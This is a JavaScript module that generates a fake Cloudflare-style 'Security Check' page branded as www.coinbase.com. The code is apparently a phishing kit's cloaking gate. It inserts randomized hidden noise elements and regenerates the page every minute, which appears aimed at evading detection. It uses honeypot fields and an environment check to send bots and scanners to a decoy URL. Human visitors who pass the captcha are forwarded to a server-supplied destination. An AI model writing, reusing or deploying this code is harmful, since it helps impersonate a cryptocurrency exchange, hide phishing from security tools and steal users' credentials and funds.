// BackgroundHTMLTransformer.js
import { promises as fsPromises } from 'fs';
import { join } from 'path';
import crypto from 'crypto';

class BackgroundHTMLTransformer {
  constructor(pagesPath) {
    this.pagesPath = pagesPath;
    this.transformedHTML = null;
    this.lastTransformTime = null;
  }

  generateRandomId(prefix = '') {
    return prefix + '_' + Math.random().toString(36).substring(2, 15);
  }

  generateRandomString(length = 8) {
    return crypto.randomBytes(length).toString('hex');
  }

  generateNoiseElements() {
    const noiseTypes = [
      () => `<!-- ${this.generateRandomString(64)} -->`,
      () => `<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="${this.generateRandomString(16)}" data-v="${this.generateRandomString(32)}" data-t="${Date.now()}"></div>`,
      () => `<meta name="_n${this.generateRandomString(8)}" content="${this.generateRandomString(32)}" data-v="${this.generateRandomString(16)}">`,
      () => `<span style="display:none!important" data-h="${this.generateRandomString(16)}" aria-hidden="true"></span>`,
      () => `<div hidden style="display:none!important" data-r="${this.generateRandomString(8)}" data-s="${this.generateRandomString(16)}"><span data-v="${this.generateRandomString(8)}"></span></div>`,
      () => `<!-- t:${Date.now()}_${this.generateRandomString(32)} -->`,
      () => `<script type="application/json" style="display:none">{"t":${Date.now()},"h":"${this.generateRandomString(32)}","v":"${this.generateRandomString(16)}"}</script>`
    ];

    const numElements = 15 + Math.floor(crypto.randomBytes(1)[0] % 15);
    const elements = [];

    for (let i = 0; i < numElements; i++) {
      const typeIndex = crypto.randomBytes(1)[0] % noiseTypes.length;
      elements.push(noiseTypes[typeIndex]());
    }

    const nestedNoise = `
      <div aria-hidden="true" style="display:none!important">
        ${Array.from({length: 3}, () => noiseTypes[crypto.randomBytes(1)[0] % noiseTypes.length]()).join('\n')}
        <div data-n="${this.generateRandomString(16)}">
          ${Array.from({length: 2}, () => noiseTypes[crypto.randomBytes(1)[0] % noiseTypes.length]()).join('\n')}
        </div>
      </div>
    `;
    elements.push(nestedNoise);

    return elements.sort(() => crypto.randomBytes(1)[0] - 128).join('\n');
  }

  async transformCaptchaPage(cloudflareKey, redirectUrl) {
    const rayId = Math.random().toString(16).substr(2, 10);
    const htmlNoise = this.generateNoiseElements();
    const bodyNoise = this.generateNoiseElements();
    const contentNoise = this.generateNoiseElements();

    return `<!DOCTYPE html>
<html lang="en" data-v="${this.generateRandomString(16)}" data-t="${Date.now()}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background-color: #1C1C1C;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            color: #d9d9d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        .content {
            max-width: 600px;
            width: 100%;
            text-align: center;
        }

        .title {
            font-size: 2rem;
            margin-bottom: 1rem;
            font-weight: 500;
        }

        .subtitle {
            font-size: 1.2rem;
            margin-bottom: 2rem;
            opacity: 0.8;
        }

        #captchaContainer {
            margin: 2rem 0;
            display: none;
            min-height: 65px;
            justify-content: center;
        }

        .message {
            margin: 1rem 0;
            font-size: 0.9rem;
            opacity: 0.7;
        }

        .footer {
            margin-top: 2rem;
            font-size: 0.8rem;
            opacity: 0.6;
        }

        .honeypot-field {
            position: absolute !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 0 !important;
            height: 0 !important;
        }
    </style>
    ${htmlNoise}
</head>
<body data-k="${this.generateRandomString(16)}" data-t="${Date.now()}">
    ${bodyNoise}
    <form id="contact-form" class="honeypot-field">
        <input type="email" name="email" autocomplete="off">
        <input type="text" name="username" autocomplete="off">
        <input type="url" name="website" autocomplete="off">
    </form>

    <div class="content">
        ${contentNoise}
        <h1 class="title">www.coinbase.com</h1>
        <p class="subtitle">Verifying your browser before accessing the site...</p>
        
        <div id="captchaContainer">
            <div class="cf-turnstile" 
                data-sitekey="${cloudflareKey}"
                data-callback="onCaptchaSuccess"
                data-theme="dark"></div>
        </div>

        <div class="message">
            This check is taking longer than expected. Please refresh the page if it doesn't load.
        </div>

        <div class="footer">
            Ray ID: <code>${rayId}</code>
        </div>
    </div>

    <script>
        let captchaToken = null;
        let verificationAttempts = 0;
        let turnstileLoaded = false;
        const maxAttempts = 3;

        async function verifyEnvironment() {
            try {
                const response = await fetch('/verify-environment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });

                const result = await response.json();
                if (!result.valid) {
                    console.error('Environment verification failed:', result.reason);
                    window.location.replace('${redirectUrl}');
                    return false;
                }

                const captchaElem = document.getElementById('captchaContainer');
                if (captchaElem && !turnstileLoaded) {
                    captchaElem.style.display = 'flex';
                    
                    const script = document.createElement('script');
                    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
                    script.async = true;
                    script.defer = true;
                    script.onload = () => {
                        turnstileLoaded = true;
                    };
                    document.body.appendChild(script);
                }
                return true;
            } catch (error) {
                console.error('Error verifying environment:', error);
                window.location.replace('${redirectUrl}');
                return false;
            }
        }

        function onCaptchaSuccess(token) {
            captchaToken = token;
            checkAccess();
        }

        async function checkAccess() {
            if (verificationAttempts >= maxAttempts) {
                window.location.replace('${redirectUrl}');
                return;
            }

            verificationAttempts++;

            try {
                const sessionId = new URLSearchParams(window.location.search).get('client_id');
                
                const formData = new FormData(document.getElementById('contact-form'));
                const honeypotData = {
                    email: formData.get('email'),
                    username: formData.get('username'),
                    website: formData.get('website')
                };

                const honeypotResponse = await fetch('/verify-honeypot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(honeypotData)
                });

                const honeypotResult = await honeypotResponse.json();
                if (honeypotResult.redirect) {
                    window.location.replace(honeypotResult.redirect);
                    return;
                }

                const verifyResponse = await fetch('/verify-turnstile', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        token: captchaToken,
                        sessionId: sessionId
                    })
                });
                
                const verifyResult = await verifyResponse.json();
                if (verifyResult.success && verifyResult.verified && verifyResult.url) {
                    window.location.replace(verifyResult.url);
                }
            } catch (error) {
                console.error('Error in checkAccess:', error);
            }
        }

        // Initialize verification when DOM is ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', verifyEnvironment);
        } else {
            verifyEnvironment();
        }
        
        // Add some noise to window object
        window._v = {
            t: Date.now(),
            h: "${this.generateRandomString(12)}",
            m: "${this.generateRandomString(32)}",
            d: {
                v: "${this.generateRandomString(16)}",
                t: Date.now(),
                h: "${this.generateRandomString(24)}"
            }
        };
    </script>
    ${this.generateNoiseElements()}
</body>
</html>`;
  }

  async startBackgroundTransform(cloudflareKey, redirectUrl) {
    try {
      this.transformedHTML = await this.transformCaptchaPage(cloudflareKey, redirectUrl);
      this.lastTransformTime = Date.now();
      
      const captchaPath = join(this.pagesPath, 'captcha.html');
      await fsPromises.writeFile(captchaPath, this.transformedHTML, 'utf8');
      console.log('Initial captcha page transformation complete');

      setInterval(async () => {
        try {
          this.transformedHTML = await this.transformCaptchaPage(cloudflareKey, redirectUrl);
          this.lastTransformTime = Date.now();
          await fsPromises.writeFile(captchaPath, this.transformedHTML, 'utf8');
        } catch (error) {
          console.error('Background transformation error:', error);
        }
      }, 60000);
    } catch (error) {
      console.error('Error starting background transform:', error);
      throw error;
    }
  }

  getLatestHTML() {
    return this.transformedHTML;
  }

  getLastTransformTime() {
    return this.lastTransformTime;
  }
}

export default BackgroundHTMLTransformer;